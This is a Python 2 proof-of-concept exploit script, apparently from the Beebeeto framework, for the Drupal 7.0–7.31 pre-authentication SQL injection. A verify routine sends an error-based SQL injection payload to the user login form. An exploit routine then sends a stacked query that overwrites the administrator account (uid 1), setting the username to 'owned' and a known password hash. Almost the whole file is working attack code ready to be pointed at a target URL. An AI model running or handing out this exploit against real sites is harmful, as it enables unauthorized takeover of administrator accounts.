#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0069',
            'name': 'Drupal 7.0-7.31 node SQL注入漏洞 Exploit',
            'author': 'tmp',
            'create_date': '2014-10-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Drupal',
            'vul_version': ['7.0-7.31'],
            'type': 'SQL Injection',
            'tag': ['Drupal漏洞', 'SQL注入漏洞'],
            'desc': 'N/A',
            'references': [
                'http://pastebin.com/F2Dk9LbX',
                'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/?q=node&destination=node'
        payload = 'name[0%20and (select 1 from  (select count(*),concat((select md5(133233))' \
                   ',floor(rand(0)*2))x from  information_schema.ta' \
                   'bles group by x)a);#]=test3&name[0]=test2&pass=test&form_id=user_lo' \
                   'gin_block'
        try:
            response = urllib2.urlopen(urllib2.Request(verify_url, data=payload)).read()
        except urllib2.HTTPError, e:
            response = e.read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Payload: ' + payload
        if '573da9cd9cf588e67327d2be25eae2cd' in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + '/?q=node&destination=node'
        payload1 = 'name[0%20and (select 1 from  (select count(*),concat((select md5(133233))' \
                   ',floor(rand(0)*2))x from  information_schema.ta' \
                   'bles group by x)a);#]=test3&name[0]=test2&pass=test&form_id=user_lo' \
                   'gin_block'
        payload2 = ("name[0%20;update+users+set+name%3d'owned'+,+pass+%3d+'$S$DkIkdKLIv"
                   "RK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3&"
                   "name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in")
        try:
            response = urllib2.urlopen(urllib2.Request(verify_url, data=payload1)).read()
        except urllib2.HTTPError, e:
            response = e.read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Payload: ' + payload1
        if '573da9cd9cf588e67327d2be25eae2cd' in response:
            sqli = urllib2.urlopen(urllib2.Request(verify_url, data=payload2))
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['username'] = 'owned'
            args['poc_ret']['password'] = 'thanks'
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
